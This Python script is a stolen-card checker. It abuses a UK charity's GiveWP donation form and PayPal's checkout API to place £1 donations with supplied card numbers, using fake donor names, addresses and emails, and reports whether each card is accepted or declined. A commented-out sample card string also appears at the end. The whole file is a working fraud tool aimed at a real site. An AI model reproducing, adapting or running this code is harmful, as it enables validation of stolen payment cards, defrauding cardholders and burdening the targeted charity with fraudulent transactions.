import requests
from bs4 import BeautifulSoup
import html
import re
from urllib.parse import urlparse, parse_qs
from faker import Faker
import random

#Sestraaaaaaaa
        
def pp(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    mm = mm.zfill(2)
    yy = yy if len(yy) == 4 else "20" + yy

    expiry = f"{yy}-{mm}"
   # print(expiry)
    #print(n)
    #print(cvc)



    session=requests.Session()


    
    headers = {
    'authority': 'mk.shirdisai.org.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://mk.shirdisai.org.uk/donations/donation-form/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    params = {
    'givewp-route': 'donation-form-view',
    'form-id': '4146',
    'locale': 'en_US',
}

    response = requests.get('https://mk.shirdisai.org.uk/', params=params, headers=headers)



    html_text = response.text

    id_match = re.search(r'"donationFormId":\s*(\d+)', html_text)
    if id_match:
        form_id = id_match.group(1)
        print("donationFormId:", form_id)
    else:
        print("donationFormId not found.")


    nonce_match = re.search(r'"donationFormNonce":"(.*?)"', html_text)
    if nonce_match:
        form_nonce = nonce_match.group(1)
        print("donationFormNonce:", form_nonce)
    else:
        print("donationFormNonce not found.")

    m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
    if m:
        donate_url = html.unescape(m.group(1))
        parsed = urlparse(donate_url)
        q = parse_qs(parsed.query)

        sig = q.get("givewp-route-signature", ["Not found"])[0]
        exp = q.get("givewp-route-signature-expiration", ["Not found"])[0]

        print("Signature:", sig)
        print("Expiration:", exp)
    else:
        print("donateUrl not found")
    
    
    session=requests.Session()
    
    headers = {
    'authority': 'www.paypal.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    params = {
    'style.label': 'paypal',
    'style.layout': 'vertical',
    'style.color': 'gold',
    'style.shape': 'rect',
    'style.tagline': 'false',
    'style.menuPlacement': 'below',
    'style.shouldApplyRebrandedStyles': 'false',
    'style.isButtonColorABTestMerchant': 'false',
    'allowBillingPayments': 'true',
    'applePaySupport': 'false',
    'buttonSessionID': 'uid_5a9930443b_mdy6ndc6mty',
    'buttonSize': 'large',
    'clientAccessToken': 'A21AANFy_o0u1L-BAqfnm78Z2eJbKhDI145M0Bvr4JRvplqT6o8RB74gnRdqcKIUnBuJ9HuTzggywc4rtvlmpqhP53oXdaliA',
    'customerId': '',
    'clientID': 'BAAZysBeRv4JJrdYGgB20qh1aUhBwhGBBvpqeQfZeBayb9j9zjWdzCjyxPlkmp97GU8MZLMHAsPKWu7m5Y',
    'clientMetadataID': 'uid_430e9f6b4e_mdy6ndy6mje',
    'commit': 'true',
    'components.0': 'buttons',
    'components.1': 'card-fields',
    'currency': 'GBP',
    'debug': 'false',
    'disableFunding.0': 'credit',
    'disableSetCookie': 'true',
    'eagerOrderCreation': 'false',
    'enableFunding.0': 'venmo',
    'env': 'production',
    'experiment.enableVenmo': 'false',
    'experiment.venmoVaultWithoutPurchase': 'false',
    'experiment.spbEagerOrderCreation': 'false',
    'experiment.venmoWebEnabled': 'false',
    'experiment.isWebViewEnabled': 'false',
    'experiment.isPaypalRebrandEnabled': 'false',
    'experiment.isPaypalRebrandABTestEnabled': 'false',
    'experiment.defaultBlueButtonColor': 'defaultBlue_lightBlue',
    'experiment.venmoEnableWebOnNonNativeBrowser': 'false',
    'flow': 'purchase',
    'fundingEligibility': 'eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOmZhbHNlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJtYWVzdHJvIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaW5lcnMiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImN1cCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiY2JfbmF0aW9uYWxlIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6dHJ1ZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzYXRpc3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYWlkeSI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ',
    'intent': 'capture',
    'jsSdkLibrary': 'paypal-js',
    'locale.country': 'IN',
    'locale.lang': 'en',
    'hasShippingCallback': 'false',
    'platform': 'mobile',
    'renderedButtons.0': 'paypal',
    'sessionID': 'uid_430e9f6b4e_mdy6ndy6mje',
    'sdkCorrelationID': 'f915935bed8b3',
    'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9pbnRlbnQ9Y2FwdHVyZSZ2YXVsdD1mYWxzZSZjdXJyZW5jeT1HQlAmY2xpZW50LWlkPUJBQVp5c0JlUnY0SkpyZFlHZ0IyMHFoMWFVaEJ3aEdCQnZwcWVRZlplQmF5YjlqOXpqV2R6Q2p5eFBsa21wOTdHVThNWkxNSEFzUEtXdTdtNVkmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZjb21wb25lbnRzPWJ1dHRvbnMsY2FyZC1maWVsZHMmZW5hYmxlLWZ1bmRpbmc9dmVubW8iLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUFBDUFYyIiwiZGF0YS11aWQiOiJ1aWRfaXN3Y2R6YnpibHFrd21vbXlhcHZpc211Z2NrZWhqIn19',
    'sdkVersion': '5.0.502',
    'storageID': 'uid_f0e14cc635_mdy6ndy6mje',
    'buttonColor.shouldApplyRebrandedStyles': 'false',
    'buttonColor.color': 'gold',
    'buttonColor.isButtonColorABTestMerchant': 'false',
    'supportedNativeBrowser': 'true',
    'supportsPopups': 'true',
    'vault': 'false',
}

    response = session.get('https://www.paypal.com/smart/buttons', params=params, headers=headers)


    html_text = response.text   

    match = re.search(r'"facilitatorAccessToken"\s*:\s*"([^"]+)"', html_text)
    if match:
        token = match.group(1)
        print("facilitatorAccessToken:", token)
    else:
        print("Not found")
    
    
    headers = {
    'authority': 'mk.shirdisai.org.uk',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    
    'origin': 'https://mk.shirdisai.org.uk',
    'referer': 'https://mk.shirdisai.org.uk/?givewp-route=donation-form-view&form-id=4146&locale=en_US',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    params = {
    'action': 'give_paypal_commerce_create_order',
}

    data = {
    'give-form-id': form_id,
    'give-form-hash': form_nonce,
    'give_payment_mode': 'paypal-commerce',
    'give-amount': '1',
    'give-recurring-period': 'undefined',
    'period': 'undefined',
    'frequency': 'undefined',
    'times': 'undefined',
    'give_first': 'Sesrra',
    'give_last': 'Op',
    'give_email': 'cashoutsestra@outlook.com',
    'card_address': 'Block',
    'card_address_2': 'Apr',
    'card_city': 'New York',
    'card_state': 'NY',
    'card_zip': '10080',
    'billing_country': 'US',
    'give-cs-form-currency': 'GBP'
}

    response = session.post(
    'https://mk.shirdisai.org.uk/wp-admin/admin-ajax.php',
    params=params,
    
    headers=headers,
    data=data,
)
    
    id = response.json()["data"]["id"]



    headers = {
    'authority': 'www.paypal.com',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {token}',
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'paypal-client-metadata-id': 'uid_430e9f6b4e_mdy6ndy6mje',
    'paypal-partner-attribution-id': '',
    'prefer': 'return=representation',
    'referer': 'https://www.paypal.com/smart/card-field?type=name&clientID=BAAZysBeRv4JJrdYGgB20qh1aUhBwhGBBvpqeQfZeBayb9j9zjWdzCjyxPlkmp97GU8MZLMHAsPKWu7m5Y&sessionID=uid_430e9f6b4e_mdy6ndy6mje&clientMetadataID=uid_430e9f6b4e_mdy6ndy6mje&cardFieldsSessionID=uid_145098f543_mdy6ndc6mty&env=production&debug=false&locale.country=IN&locale.lang=en&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9pbnRlbnQ9Y2FwdHVyZSZ2YXVsdD1mYWxzZSZjdXJyZW5jeT1HQlAmY2xpZW50LWlkPUJBQVp5c0JlUnY0SkpyZFlHZ0IyMHFoMWFVaEJ3aEdCQnZwcWVRZlplQmF5YjlqOXpqV2R6Q2p5eFBsa21wOTdHVThNWkxNSEFzUEtXdTdtNVkmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZjb21wb25lbnRzPWJ1dHRvbnMsY2FyZC1maWVsZHMmZW5hYmxlLWZ1bmRpbmc9dmVubW8iLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUFBDUFYyIiwiZGF0YS11aWQiOiJ1aWRfaXN3Y2R6YnpibHFrd21vbXlhcHZpc211Z2NrZWhqIn19&disable-card=&currency=GBP&intent=capture&commit=true&vault=false&sdkCorrelationID=f915935bed8b3',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'payment_source': {
        'card': {
            'number': n,
            'security_code': cvc,
            'expiry': expiry,
        },
    },
}

    response = session.post(
    f'https://www.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
    headers=headers,
    json=json_data,
)






    headers = {
    'authority': 'mk.shirdisai.org.uk',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    
    # 'cookie': 'PHPSESSID=3j3238h9vudibngrhj9osecssr; cookieyes-consent=consentid:aFhJbDlNUW9WVjgxcDlac2JmYmZ3Q2NtT0FUZmRMSUs,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no',
    'origin': 'https://mk.shirdisai.org.uk',
    'referer': 'https://mk.shirdisai.org.uk/?givewp-route=donation-form-view&form-id=4146&locale=en_US',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    params = {
    'givewp-route': 'donate',
    'givewp-route-signature': sig,
    'givewp-route-signature-id': 'givewp-donate',
    'givewp-route-signature-expiration': exp,
}

    files = {
    'amount': (None, '1'),
    'currency': (None, 'GBP'),
    'donationType': (None, 'single'),
    'formId': (None, form_id),
    'gatewayId': (None, 'paypal-commerce'),
    'can_we_reclaim_gift_aid_on_your_donation': (None, 'Yes'),
    'honorific': (None, 'Mr'),
    'firstName': (None, 'Shaikh'),
    'lastName': (None, 'Wasiullah'),
    'email': (None, 'caleboh973@maonyn.com'),
    'country': (None, 'US'),
    'address1': (None, '564 Street Road'),
    'address2': (None, 'Road'),
    'city': (None, 'Altamont'),
    'state': (None, 'NM'),
    'zip': (None, '12009'),
    'phone': (None, '+13132462926'),
    'donationBirthday': (None, ''),
    'originUrl': (None, 'https://mk.shirdisai.org.uk/donations/donation-form/'),
    'isEmbed': (None, 'true'),
    'embedId': (None, '4146'),
    'locale': (None, 'en_US'),
    'gatewayData[payPalOrderId]': (None, id),
}

    response = session.post('https://mk.shirdisai.org.uk/', params=params,  headers=headers, files=files)

    print(response.text)
    try:
        response_data = response.json()  # Parse JSON response
        if response_data.get("success"):
            print("✅ Payment was successful.")
            return "✅ Payment was successful."
        else:
        # Safely get nested error message
            errors = response_data.get("data", {}).get("errors", {}).get("errors", {}).get("gateway_error", [])
            if errors and "PayPal Order has been declined." in errors[0]:
                print("❌ Payment declined by PayPal.")
                return "❌ Payment declined by PayPal."
            else:
                print(f"❌ Payment failed. Reason: {errors}")
                return errors
    except ValueError:
        return "Failed to get API response."
#print(pp("5170414709756023|10|27|237"))  
